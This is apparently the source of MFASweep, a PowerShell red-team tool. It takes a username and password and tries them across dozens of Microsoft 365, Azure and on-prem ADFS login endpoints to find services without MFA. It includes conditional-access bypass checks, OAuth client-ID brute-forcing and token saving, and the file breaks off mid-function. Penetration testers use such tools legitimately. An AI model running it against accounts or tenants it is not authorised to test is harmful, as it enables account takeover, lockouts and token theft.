Function Invoke-MFASweepWebRequest {

    [CmdletBinding(DefaultParameterSetName = "Uri")]
    Param(

    [Parameter(Mandatory = $True, Position = 0, ParameterSetName = "Uri")]
    [string]
    $Uri,

    [Parameter(Mandatory = $False)]
    [string]
    $Method = "Get",

    [Parameter(Mandatory = $False)]
    $Headers,

    [Parameter(Mandatory = $False)]
    $Body,

    [Parameter(Mandatory = $False)]
    $WebSession,

    [Parameter(Mandatory = $False)]
    [string]
    $SessionVariable,

    [Parameter(Mandatory = $False)]
    [string]
    $UserAgent,

    [Parameter(Mandatory = $False)]
    [int]
    $MaximumRedirection

    )

    $invokeParams = @{
        Uri = $Uri
        Method = $Method
    }

    if ($PSBoundParameters.ContainsKey('Headers')) {
        $invokeParams.Headers = $Headers
    }
    if ($PSBoundParameters.ContainsKey('Body')) {
        $invokeParams.Body = $Body
    }
    if ($PSBoundParameters.ContainsKey('WebSession')) {
        $invokeParams.WebSession = $WebSession
    }
    if ($PSBoundParameters.ContainsKey('SessionVariable')) {
        $invokeParams.SessionVariable = $SessionVariable
    }
    if ($PSBoundParameters.ContainsKey('UserAgent')) {
        $invokeParams.UserAgent = $UserAgent
    }
    if ($PSBoundParameters.ContainsKey('ErrorAction')) {
        $invokeParams.ErrorAction = $PSBoundParameters['ErrorAction']
    }
    if ($PSBoundParameters.ContainsKey('ErrorVariable')) {
        $invokeParams.ErrorVariable = $PSBoundParameters['ErrorVariable']
    }
    if ($PSBoundParameters.ContainsKey('MaximumRedirection')) {
        $invokeParams.MaximumRedirection = $MaximumRedirection
    }

    # Windows PowerShell 5.1 requires -UseBasicParsing on Invoke-WebRequest when
    # IE components are unavailable. PowerShell 6+ removed this switch.
    if ($PSVersionTable.PSVersion.Major -lt 6) {
        $invokeParams.UseBasicParsing = $true
    }

    Invoke-WebRequest @invokeParams
}

Function Invoke-MFASweep{

<#
  
  .SYNOPSIS
  
    This script attempts to login to various Microsoft services using a provided set of credentials. It will attempt to identify where authentication was successful and in some cases where MFA is enabled. WARNING: It is very possible (and easy) to lock an account out with this tool. Make sure you are using a valid set of credentials to avoid lockouts.

    Author: Beau Bullock (@dafthack)
    License: MIT
    Required Dependencies: None
    Optional Dependencies: None
  
    .DESCRIPTION
    This script attempts to login to various Microsoft services using a provided set of credentials. It will attempt to identify where authentication was successful and in some cases where MFA is enabled. By default this script will attempt to login to the Microsoft Graph API, Azure Resource Manager API, Microsoft 365 Exchange Web Services, Microsoft 365 Web Portal with multiple user agents, and Microsoft 365 Active Sync. It also has an additional check for ADFS configurations and can attempt to login to the on-prem ADFS server if detected.
      
    .PARAMETER Username
    Email Address to use during Authentication

    .PARAMETER Password
    The password for the account you want to authenticate with

    .PARAMETER Recon
    When the Recon flag is set the script will attempt to locate ADFS configurations

    .PARAMETER ADFS
    When the ADFS flag is set the script will attempt to login to ADFS in addition to the other Microsoft protocols

    .PARAMETER WriteTokens
    Use this flag to write any cookies and access/refresh tokens to a file called AccessTokens.json in the current directory. (Currently does not log cookies or tokens for EWS, ActiveSync, and ADFS)
  
    .EXAMPLE
    C:\PS> Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 
    
    Description
    -----------
    This command will use the provided credentials and attempt to authenticate to the Microsoft Graph API, Azure Resource Manager API, Microsoft 365 Exchange Web Services, Microsoft 365 Web Portal with multiple user agents, and Microsoft 365 Active Sync. Prompts for performing recon and authenticating to ADFS will be displayed.
  
    .EXAMPLE
    C:\PS> Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 -Recon -IncludeADFS
    
    Description
    -----------
    This command will use the provided credentials and attempt to authenticate to the Microsoft Graph API, Azure Resource Manager API, Microsoft 365 Exchange Web Services, Microsoft 365 Web Portal, Microsoft 365 Active Sync and ADFS.
  
#>


    Param(
    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Username = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Password = "",
    
    [Parameter(Position = 2, Mandatory = $False)]
    [Switch]
    $Recon,

    [Parameter(Position = 3, Mandatory = $False)]
    [Switch]
    $IncludeADFS,

    [Parameter(Position = 4, Mandatory = $False)]
    [Switch]
    $WriteTokens,

    [Parameter(Position = 5, Mandatory = $False)]
    [Switch]
    $DebugWebAuth,

    [Parameter(Position = 6, Mandatory = $False)]
    [string]
    $DebugUserAgent = "iPhone",

    # Skip the "are you sure?" confirmation prompt (useful for automation)
    [Parameter(Position = 7, Mandatory = $False)]
    [Switch]
    $SkipConfirmation,

    # Path to write an HTML results report (e.g. C:\results\sweep.html)
    [Parameter(Position = 8, Mandatory = $False)]
    [string]
    $OutputPath = "",

    # Test SMTP Basic Auth against smtp.office365.com:587
    [Parameter(Position = 9, Mandatory = $False)]
    [Switch]
    $IncludeSMTP,

    # Test IMAP Basic Auth against outlook.office365.com:993
    [Parameter(Position = 10, Mandatory = $False)]
    [Switch]
    $IncludeIMAP,

    # Test Microsoft Teams API via ROPC
    [Parameter(Position = 11, Mandatory = $False)]
    [Switch]
    $IncludeTeams,

    # Test SharePoint/OneDrive API via ROPC (requires -SharePointDomain)
    [Parameter(Position = 12, Mandatory = $False)]
    [Switch]
    $IncludeSharePoint,

    # Tenant SharePoint domain prefix, e.g. "contoso" for contoso.sharepoint.com
    [Parameter(Position = 13, Mandatory = $False)]
    [string]
    $SharePointDomain = "",

    # Test POP3 Basic Auth against outlook.office365.com:995
    [Parameter(Position = 14, Mandatory = $False)]
    [Switch]
    $IncludePOP3,

    # Test WS-Trust endpoint (legacy SOAP auth  - inherently no MFA)
    [Parameter(Position = 15, Mandatory = $False)]
    [Switch]
    $IncludeWSTrust,

    # Test Outlook REST API via ROPC (outlook.office.com)
    [Parameter(Position = 16, Mandatory = $False)]
    [Switch]
    $IncludeOutlookREST,

    # Test Office 365 Management API via ROPC (manage.office.com)
    [Parameter(Position = 17, Mandatory = $False)]
    [Switch]
    $IncludeOfficeManagement,

    # Test Power BI API via ROPC (analysis.windows.net/powerbi/api)
    [Parameter(Position = 18, Mandatory = $False)]
    [Switch]
    $IncludePowerBI,

    # Check if Device Code Flow is available (non-credential, probes endpoint availability)
    [Parameter(Position = 19, Mandatory = $False)]
    [Switch]
    $IncludeDeviceCodeCheck,

    # Test Azure Key Vault API via ROPC (vault.azure.net) - access to secrets, keys, certs
    [Parameter(Mandatory = $False)]
    [Switch]$IncludeKeyVault,

    # Test Azure DevOps / VSTS via ROPC (app.vssps.visualstudio.com) - source code, pipelines
    [Parameter(Mandatory = $False)]
    [Switch]$IncludeAzureDevOps,

    # Test Microsoft Defender for Endpoint API via ROPC (api.securitycenter.microsoft.com)
    [Parameter(Mandatory = $False)]
    [Switch]$IncludeDefender,

    # Test Microsoft Intune API via ROPC (api.manage.microsoft.com) - MDM device management
    [Parameter(Mandatory = $False)]
    [Switch]$IncludeIntune,

    # Test legacy Azure AD Graph v1 API via ROPC (graph.windows.net) - often less restricted
    [Parameter(Mandatory = $False)]
    [Switch]$IncludeAADGraph,

    # Test OWA (Outlook Web Access) legacy Basic Auth (outlook.office365.com/owa/)
    [Parameter(Mandatory = $False)]
    [Switch]$IncludeOWA,

    # Test Azure Log Analytics / Sentinel API via ROPC (api.loganalytics.io)
    [Parameter(Mandatory = $False)]
    [Switch]$IncludeLogAnalytics,

    # Test ADFS usernamemixed WS-Trust endpoint on the on-prem ADFS server (federated domains only)
    [Parameter(Mandatory = $False)]
    [Switch]$IncludeADFSUsernameMixed,

    # Check if Azure AD Seamless SSO (SSSO) is enabled - passive, no credentials needed
    [Parameter(Mandatory = $False)]
    [Switch]$IncludeAzureADSSO,

    # Test Exchange Online Remote PowerShell Basic Auth (outlook.office365.com/powershell-liveid/)
    [Parameter(Mandatory = $False)]
    [Switch]$IncludeExchangePS,

    # Check if Certificate-Based Authentication (CBA) is configured for this tenant - passive
    [Parameter(Mandatory = $False)]
    [Switch]$IncludeCBACheck,

    # Test ROPC with per-platform User-Agent and MSAL headers to find CA platform-condition gaps
    [Parameter(Mandatory = $False)]
    [Switch]$IncludePlatformCABypass,

    # Brute-force client IDs across resources to find single-factor OAuth combinations
    [Parameter(Mandatory = $False)]
    [Switch]$IncludeBruteClientIDs,

    [Parameter(Mandatory = $False)]
    [Switch]$BruteFullClientIdList,

    [Parameter(Mandatory = $False)]
    [Switch]$BruteFullResourceList,

    # Run every optional test (equivalent to passing all -Include* switches)
    [Parameter(Mandatory = $False)]
    [Switch]$IncludeAll

    )

    # Expand -IncludeAll into individual switches
    if ($IncludeAll) {
        $IncludeADFS = $true; $IncludeSMTP = $true; $IncludeIMAP = $true; $IncludePOP3 = $true
        $IncludeWSTrust = $true; $IncludeOutlookREST = $true; $IncludeOfficeManagement = $true
        $IncludePowerBI = $true; $IncludeDeviceCodeCheck = $true; $IncludeTeams = $true
        $IncludeKeyVault = $true; $IncludeAzureDevOps = $true; $IncludeDefender = $true
        $IncludeIntune = $true; $IncludeAADGraph = $true; $IncludeOWA = $true
        $IncludeLogAnalytics = $true; $IncludeADFSUsernameMixed = $true; $IncludeAzureADSSO = $true
        $IncludeExchangePS = $true; $IncludeCBACheck = $true; $IncludePlatformCABypass = $true
        $IncludeBruteClientIDs = $true
    }

    Write-Host "---------------- MFASweep ----------------"
    $Tab = [char]9
    if ($Recon -eq $false){

        $recontitle = "Microsoft Services Recon"
        $reconmessage = "This script can attempt to determine if ADFS is configured for the domain you submitted. Would you like to do this now?"

        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Sends a web request to Microsoft Online to determine if ADFS is enabled."

        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
            "Moves on without performing recon."

        $reconoptions = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

        $reconresult = $host.ui.PromptForChoice($recontitle, $reconmessage, $reconoptions, 0)

        if ($reconresult -ne 0)
        {
            Write-Host -ForegroundColor Yellow "[*] Not performing recon."
        
        }
        if ($reconresult -eq 0){
            $Recon = $True
        }
    }

    if ($Recon){

        Write-Host "---------------- Running recon checks ----------------"
    
        Write-Host "[*] Checking if ADFS configured..."

        $ADFSCheck = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=$UserName&xml=1"
        [xml]$ADFSXML = $ADFSCheck.Content
        [uri]$RootADFSURL = $ADFSXML.RealmInfo.AuthUrl
        $ADFSDomain = $RootADFSURL.Host
        If($adfsxml.RealmInfo.NameSpaceType -like "Federated"){
    
        Write-Host -ForegroundColor Cyan "[*] ADFS appears to be in use."
        Write-Host -ForegroundColor Cyan ("[*] The ADFS authentication URL is here: " + $adfsxml.RealmInfo.AuthURL)

            $adfstitle = "ADFS Authentication"
            $adfsmessage = "Do you want to include ADFS in the authentication checks? This is generally an on-premise system. If you select yes an authentication attempt will be made to the system at $ADFSDomain."

            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                "Will attempt to authenticate to ADFS."

            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
                "Moves on with normal login attempts."

            $adfsoptions = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

            $global:adfsresult = $host.ui.PromptForChoice($adfstitle, $adfsmessage, $adfsoptions, 0)

            if ($global:adfsresult -ne 0)
            {
                Write-Host -ForegroundColor Yellow "[*] ADFS authentication is not being performed."
        
            }
            if ($global:adfsresult -eq 0){
                $IncludeADFS = $True
            }


        }
        ElseIf($adfsxml.RealmInfo.NameSpaceType -like "Managed"){
    
        Write-Host -ForegroundColor Cyan "[*] ADFS does not appear to be in use. Authentication appears to be managed by Microsoft."
        }
        ElseIf($adfsxml.RealmInfo.NameSpaceType -like "Unknown"){
    
        Write-Host -ForegroundColor Red "[*] The domain associated with the email address you submitted does appear to have a presence in Microsoft Online / O365. Authentication will likely fail."
        }

    }


    if (-not $SkipConfirmation) {
        $title = "Confirm MFA Sweep"
        $message = "[*] WARNING: This script is about to attempt logging into the $username account multiple times. If you entered an incorrect password this may lock the account out. Are you sure you want to continue?"

        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate to different Microsoft services."

        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
            "Stops the execution of the script."

        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

        $result = $host.ui.PromptForChoice($title, $message, $options, 0)

        if ($result -ne 0)
        {
            Write-Host -ForegroundColor Yellow "[*] Stopping the execution of the script."
            break
        }
    } else {
        Write-Host -ForegroundColor Yellow "[*] Skipping confirmation prompt (-SkipConfirmation flag set)."
    }

    $global:graphresult = "NO"
    $global:smresult = "NO"
    $global:o365wresult = "NO"
    $global:o365lresult = "NO"
    $global:o365mresult = "NO"
    $global:o365apresult = "NO"
    $global:o365ipresult = "NO"
    $global:o365wpresult = "NO"
    $global:o365upresult = "NO"
    $global:ewsresult = "NO"
    $global:asyncresult = "NO"
    $global:adfsresult = "NO"
    $global:smtpresult = "N/A"
    $global:imapresult = "N/A"
    $global:pop3result = "N/A"
    $global:wstrustresult = "N/A"
    $global:outlookrestresult = "N/A"
    $global:officemgmtresult = "N/A"
    $global:powerbiresult = "N/A"
    $global:devicecoderesult = "N/A"
    $global:teamsresult        = "N/A"
    $global:sharepointresult   = "N/A"
    $global:keyvaultresult     = "N/A"
    $global:devopsresult       = "N/A"
    $global:defenderresult     = "N/A"
    $global:intuneresult       = "N/A"
    $global:aadgraphresult     = "N/A"
    $global:owaresult          = "N/A"
    $global:loganalyticsresult      = "N/A"
    $global:adfsusernamemixedresult = "N/A"
    $global:aadssocheck             = "N/A"
    $global:exchangepsresult        = "N/A"
    $global:cbaresult               = "N/A"
    $global:platformcabypassresult  = "N/A"
    $global:bruteclientidsresult    = "N/A"
    $global:bruteClientIDHits       = 0
    $global:SweepStartTime = Get-Date


    Write-Output "########################### Microsoft API Checks ###########################"
    if($WriteTokens){
        Invoke-GraphAPIAuth -Username $Username -Password $Password -WriteTokens
        Invoke-AzureManagementAPIAuth -Username $Username -Password $Password -WriteTokens
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Microsoft Web Portal User Agent Checks ###########################"
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype Windows -WriteTokens -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype Linux -WriteTokens -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype MacOS -WriteTokens -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype Android -WriteTokens -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype iPhone -WriteTokens -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype WindowsPhone -WriteTokens -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype NintendoSwitch -WriteTokens -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
    }
    else{
        Invoke-GraphAPIAuth -Username $Username -Password $Password
        Invoke-AzureManagementAPIAuth -Username $Username -Password $Password
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Microsoft Web Portal User Agent Checks ###########################"
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype Windows -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype Linux -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype MacOS -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype Android -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype iPhone -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype WindowsPhone -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype NintendoSwitch -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
    }
    Write-Output "############################################################################################################"
    Write-Host `r`n
    Write-Output "########################### Legacy Auth Checks ###########################"
    Invoke-EWSAuth -Username $Username -Password $Password
    Invoke-O365ActiveSyncAuth -Username $Username -Password $Password
    Write-Output "############################################################################################################"
    Write-Host `r`n
    

    If($IncludeADFS){
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### ADFS Check ###########################"
        Invoke-ADFSAuth -Username $Username -Password $Password

    }

    If($IncludeSMTP) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### SMTP Basic Auth Check ###########################"
        $global:smtpresult = "NO"
        Invoke-SMTPAuth -Username $Username -Password $Password
    }

    If($IncludeIMAP) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### IMAP Basic Auth Check ###########################"
        $global:imapresult = "NO"
        Invoke-IMAPAuth -Username $Username -Password $Password
    }

    If($IncludeTeams) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Microsoft Teams API Check ###########################"
        $global:teamsresult = "NO"
        if ($WriteTokens) {
            Invoke-TeamsROPCAuth -Username $Username -Password $Password -WriteTokens
        } else {
            Invoke-TeamsROPCAuth -Username $Username -Password $Password
        }
    }

    If($IncludeSharePoint -and $SharePointDomain -ne "") {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### SharePoint / OneDrive API Check ###########################"
        $global:sharepointresult = "NO"
        if ($WriteTokens) {
            Invoke-SharePointROPCAuth -Username $Username -Password $Password -TenantDomain $SharePointDomain -WriteTokens
        } else {
            Invoke-SharePointROPCAuth -Username $Username -Password $Password -TenantDomain $SharePointDomain
        }
    } ElseIf($IncludeSharePoint -and $SharePointDomain -eq "") {
        Write-Host -ForegroundColor Red "[*] -IncludeSharePoint requires -SharePointDomain (e.g. -SharePointDomain contoso). Skipping."
    }

    If($IncludePOP3) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### POP3 Basic Auth Check ###########################"
        $global:pop3result = "NO"
        Invoke-POP3Auth -Username $Username -Password $Password
    }

    If($IncludeWSTrust) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### WS-Trust Legacy SOAP Auth Check ###########################"
        $global:wstrustresult = "NO"
        Invoke-WSTrustAuth -Username $Username -Password $Password
    }

    If($IncludeOutlookREST) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Outlook REST API (ROPC) Check ###########################"
        $global:outlookrestresult = "NO"
        if ($WriteTokens) {
            Invoke-OutlookRESTAuth -Username $Username -Password $Password -WriteTokens
        } else {
            Invoke-OutlookRESTAuth -Username $Username -Password $Password
        }
    }

    If($IncludeOfficeManagement) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Office 365 Management API (ROPC) Check ###########################"
        $global:officemgmtresult = "NO"
        if ($WriteTokens) {
            Invoke-OfficeManagementAuth -Username $Username -Password $Password -WriteTokens
        } else {
            Invoke-OfficeManagementAuth -Username $Username -Password $Password
        }
    }

    If($IncludePowerBI) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Power BI API (ROPC) Check ###########################"
        $global:powerbiresult = "NO"
        if ($WriteTokens) {
            Invoke-PowerBIAuth -Username $Username -Password $Password -WriteTokens
        } else {
            Invoke-PowerBIAuth -Username $Username -Password $Password
        }
    }

    If($IncludeDeviceCodeCheck) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Device Code Flow Availability Check ###########################"
        $global:devicecoderesult = "NO"
        Invoke-DeviceCodeFlowCheck -Username $Username
    }

    If($IncludeKeyVault) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Azure Key Vault API (ROPC) Check ###########################"
        $global:keyvaultresult = "NO"
        if ($WriteTokens) { Invoke-KeyVaultAuth -Username $Username -Password $Password -WriteTokens }
        else               { Invoke-KeyVaultAuth -Username $Username -Password $Password }
    }

    If($IncludeAzureDevOps) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Azure DevOps / VSTS API (ROPC) Check ###########################"
        $global:devopsresult = "NO"
        if ($WriteTokens) { Invoke-AzureDevOpsAuth -Username $Username -Password $Password -WriteTokens }
        else               { Invoke-AzureDevOpsAuth -Username $Username -Password $Password }
    }

    If($IncludeDefender) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Microsoft Defender for Endpoint API (ROPC) Check ###########################"
        $global:defenderresult = "NO"
        if ($WriteTokens) { Invoke-DefenderAuth -Username $Username -Password $Password -WriteTokens }
        else               { Invoke-DefenderAuth -Username $Username -Password $Password }
    }

    If($IncludeIntune) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Microsoft Intune API (ROPC) Check ###########################"
        $global:intuneresult = "NO"
        if ($WriteTokens) { Invoke-IntuneAuth -Username $Username -Password $Password -WriteTokens }
        else               { Invoke-IntuneAuth -Username $Username -Password $Password }
    }

    If($IncludeAADGraph) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Azure AD Graph v1 Legacy API (ROPC) Check ###########################"
        $global:aadgraphresult = "NO"
        if ($WriteTokens) { Invoke-AADGraphAuth -Username $Username -Password $Password -WriteTokens }
        else               { Invoke-AADGraphAuth -Username $Username -Password $Password }
    }

    If($IncludeOWA) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### OWA Basic Auth Check ###########################"
        $global:owaresult = "NO"
        Invoke-OWABasicAuth -Username $Username -Password $Password
    }

    If($IncludeLogAnalytics) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Azure Log Analytics / Sentinel API (ROPC) Check ###########################"
        $global:loganalyticsresult = "NO"
        if ($WriteTokens) { Invoke-LogAnalyticsAuth -Username $Username -Password $Password -WriteTokens }
        else               { Invoke-LogAnalyticsAuth -Username $Username -Password $Password }
    }

    If($IncludeADFSUsernameMixed) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### ADFS UsernameMixed WS-Trust Check ###########################"
        $global:adfsusernamemixedresult = "NO"
        Invoke-ADFSUsernameMixedAuth -Username $Username -Password $Password
    }

    If($IncludeAzureADSSO) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Azure AD Seamless SSO Availability Check ###########################"
        Invoke-AzureADSSOCheck -Username $Username
    }

    If($IncludeExchangePS) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Exchange Online Remote PowerShell Basic Auth Check ###########################"
        $global:exchangepsresult = "NO"
        Invoke-ExchangePSBasicAuth -Username $Username -Password $Password
    }

    If($IncludeCBACheck) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Certificate-Based Authentication (CBA) Availability Check ###########################"
        Invoke-CBAAvailabilityCheck -Username $Username
    }

    If($IncludePlatformCABypass) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Conditional Access Platform-Condition Bypass (ROPC) Check ###########################"
        Invoke-PlatformCABypass -Username $Username -Password $Password
    }

    If($IncludeBruteClientIDs) {
        Write-Output "############################################################################################################"
        Write-Host `r`n
        Write-Output "########################### Client ID Brute Force (ROPC across all registered app client IDs) ###########################"
        $global:bruteClientIDHits = 0
        Invoke-BruteClientIDs -Username $Username -Password $Password `
            -FullClientIdList:$BruteFullClientIdList `
            -FullResourceList:$BruteFullResourceList
        $global:bruteclientidsresult = if ($global:bruteClientIDHits -gt 0) { "YES ($($global:bruteClientIDHits) combos)" } else { "NO" }
    }

    Write-Host -ForegroundColor Yellow "######### SINGLE FACTOR ACCESS RESULTS #########"
    $results = @(
    [pscustomobject]@{Service="Microsoft Graph API";              Protocol="ROPC";       Result=$global:graphresult},
    [pscustomobject]@{Service="Azure Resource Manager API";       Protocol="ROPC";       Result=$global:smresult},
    [pscustomobject]@{Service="M365 w/ Windows UA";               Protocol="Web Form";   Result=$global:o365wresult},
    [pscustomobject]@{Service="M365 w/ Linux UA";                 Protocol="Web Form";   Result=$global:o365lresult},
    [pscustomobject]@{Service="M365 w/ MacOS UA";                 Protocol="Web Form";   Result=$global:o365mresult},
    [pscustomobject]@{Service="M365 w/ Android UA";               Protocol="Web Form";   Result=$global:o365apresult},
    [pscustomobject]@{Service="M365 w/ iPhone UA";                Protocol="Web Form";   Result=$global:o365ipresult},
    [pscustomobject]@{Service="M365 w/ Windows Phone UA";         Protocol="Web Form";   Result=$global:o365wpresult},
    [pscustomobject]@{Service="M365 w/ Unknown Platform UA";      Protocol="Web Form";   Result=$global:o365upresult},
    [pscustomobject]@{Service="Exchange Web Services (EWS)";      Protocol="Basic Auth"; Result=$global:ewsresult},
    [pscustomobject]@{Service="Active Sync";                      Protocol="Basic Auth"; Result=$global:asyncresult}
)

    if ($IncludeADFS)            { $results += [pscustomobject]@{Service="ADFS";                             Protocol="Forms Auth"; Result=$global:adfsresult} }
    if ($IncludeSMTP)            { $results += [pscustomobject]@{Service="SMTP (smtp.office365.com:587)";    Protocol="Basic Auth"; Result=$global:smtpresult} }
    if ($IncludeIMAP)            { $results += [pscustomobject]@{Service="IMAP (outlook.office365.com:993)"; Protocol="Basic Auth"; Result=$global:imapresult} }
    if ($IncludePOP3)            { $results += [pscustomobject]@{Service="POP3 (outlook.office365.com:995)"; Protocol="Basic Auth"; Result=$global:pop3result} }
    if ($IncludeWSTrust)         { $results += [pscustomobject]@{Service="WS-Trust SOAP Endpoint";           Protocol="WS-Trust";   Result=$global:wstrustresult} }
    if ($IncludeOutlookREST)     { $results += [pscustomobject]@{Service="Outlook REST API";                 Protocol="ROPC";       Result=$global:outlookrestresult} }
    if ($IncludeOfficeManagement){ $results += [pscustomobject]@{Service="Office 365 Management API";        Protocol="ROPC";       Result=$global:officemgmtresult} }
    if ($IncludePowerBI)         { $results += [pscustomobject]@{Service="Power BI API";                     Protocol="ROPC";       Result=$global:powerbiresult} }
    if ($IncludeDeviceCodeCheck) { $results += [pscustomobject]@{Service="Device Code Flow";                 Protocol="OAuth2 DCF"; Result=$global:devicecoderesult} }
    if ($IncludeTeams)           { $results += [pscustomobject]@{Service="Microsoft Teams API";              Protocol="ROPC";       Result=$global:teamsresult} }
    if ($IncludeSharePoint -and $SharePointDomain -ne "") {
                                   $results += [pscustomobject]@{Service="SharePoint/OneDrive ($SharePointDomain)"; Protocol="ROPC"; Result=$global:sharepointresult} }
    if ($IncludeKeyVault)        { $results += [pscustomobject]@{Service="Azure Key Vault API";               Protocol="ROPC";       Result=$global:keyvaultresult} }
    if ($IncludeAzureDevOps)     { $results += [pscustomobject]@{Service="Azure DevOps / VSTS";               Protocol="ROPC";       Result=$global:devopsresult} }
    if ($IncludeDefender)        { $results += [pscustomobject]@{Service="Defender for Endpoint API";         Protocol="ROPC";       Result=$global:defenderresult} }
    if ($IncludeIntune)          { $results += [pscustomobject]@{Service="Microsoft Intune API";              Protocol="ROPC";       Result=$global:intuneresult} }
    if ($IncludeAADGraph)        { $results += [pscustomobject]@{Service="Azure AD Graph v1 (legacy)";        Protocol="ROPC";       Result=$global:aadgraphresult} }
    if ($IncludeOWA)             { $results += [pscustomobject]@{Service="OWA Basic Auth";                    Protocol="Basic Auth"; Result=$global:owaresult} }
    if ($IncludeLogAnalytics)       { $results += [pscustomobject]@{Service="Azure Log Analytics / Sentinel";    Protocol="ROPC";        Result=$global:loganalyticsresult} }
    if ($IncludeADFSUsernameMixed)  { $results += [pscustomobject]@{Service="ADFS UsernameMixed (on-prem)";     Protocol="WS-Trust";    Result=$global:adfsusernamemixedresult} }
    if ($IncludeAzureADSSO)         { $results += [pscustomobject]@{Service="Azure AD Seamless SSO";            Protocol="Kerberos";    Result=$global:aadssocheck} }
    if ($IncludeExchangePS)         { $results += [pscustomobject]@{Service="Exchange Online Remote PS";        Protocol="Basic Auth";  Result=$global:exchangepsresult} }
    if ($IncludeCBACheck)           { $results += [pscustomobject]@{Service="Certificate-Based Auth (CBA)";     Protocol="x.509 Cert";  Result=$global:cbaresult} }
    if ($IncludePlatformCABypass)  { $results += [pscustomobject]@{Service="CA Platform Bypass (best platform)"; Protocol="ROPC";       Result=$global:platformcabypassresult} }
    if ($IncludeBruteClientIDs)   { $results += [pscustomobject]@{Service="Client ID Brute Force";               Protocol="ROPC";       Result=$global:bruteclientidsresult} }

    $SweepEndTime  = Get-Date
    $SweepDuration = ($SweepEndTime - $global:SweepStartTime).ToString("hh\:mm\:ss")
    $SingleFactorCount = ($results | Where-Object { $_.Result -match "^YES" }).Count

    Write-Host ""
    Write-Host -ForegroundColor Cyan "  Target   : $Username"
    Write-Host -ForegroundColor Cyan "  Started  : $($global:SweepStartTime.ToString('yyyy-MM-dd HH:mm:ss'))"
    Write-Host -ForegroundColor Cyan "  Duration : $SweepDuration"
    Write-Host -ForegroundColor Cyan "  Single-factor access found: $SingleFactorCount / $($results.Count) service(s)"
    Write-Host ""

    $maxSvcLen  = ($results | ForEach-Object { $_.Service.Length }  | Measure-Object -Maximum).Maximum
    $maxProtoLen = ($results | ForEach-Object { $_.Protocol.Length } | Measure-Object -Maximum).Maximum

    $results | ForEach-Object {
